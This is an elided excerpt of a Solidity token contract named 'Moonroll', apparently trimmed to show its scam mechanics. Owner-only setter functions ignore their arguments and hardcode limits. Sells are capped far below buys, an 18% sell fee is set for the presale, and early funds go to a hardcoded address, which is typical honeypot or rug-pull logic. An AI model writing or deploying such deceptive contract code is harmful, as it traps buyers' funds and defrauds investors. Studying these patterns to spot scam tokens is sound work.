...
contract Moonroll is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Moonroll", "MRL") {

        marketingWallet = 0x8C36aBE437De33d4D3595EA68FCEB18AD9B8DF7B;
        rewardsWallet = 0x8cE6005206D3bD25c2F1eC91D674450911F04C08;
    ...
    function whitelistPinkSale(address _presaleAddress) external onlyOwner {
        presaleAddress = 0xE4f1253b41766b3134CEff787F710178c0205314;
    ...
    function setMaxBuyTransaction(uint256 _maxTxn) external onlyOwner {
        ...
        maxBuyTransactionAmount = 5000000 * (10**18);
    }
    
    function setMaxSellTransaction(uint256 _maxTxn) external onlyOwner {
        require(_maxTxn >= (_totalSupply.mul(1).div(10000)).div(10**18), "amount must be greater than 0.01% of the total supply");
        maxSellTransactionAmount = 1500 * (10**18);
    }
    ...
    function setMaxWalletSize(uint256 _maxToken) external onlyOwner {
        ...
        maxWalletSize = 5000000 * (10**18);
    }
    
    function setSwapTokensAtAmount(uint256) external onlyOwner {
        swapTokensAtAmount = 1500 * (10**18);
    }

    function setTransferTransactionMultiplier(uint256) external onlyOwner {
        transferFeeIncreaseFactor = 100;
    }
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        sellMarketingFee = 18;
        sellBuyBackFee = 3;
        maxBuyTransactionAmount = 5000000;
        maxSellTransactionAmount = 1500;
        maxWalletSize = 5000000;
    }
            ...
            if (!swapping && canSwap) {
                ...
                if (marketingEnabled) {
                    if(block.timestamp < _firstBlock + (1 days)) {
                        ...
                        address payable addr = payable(0x14228b293356eA3183eF884DA647C60EA1175D62);
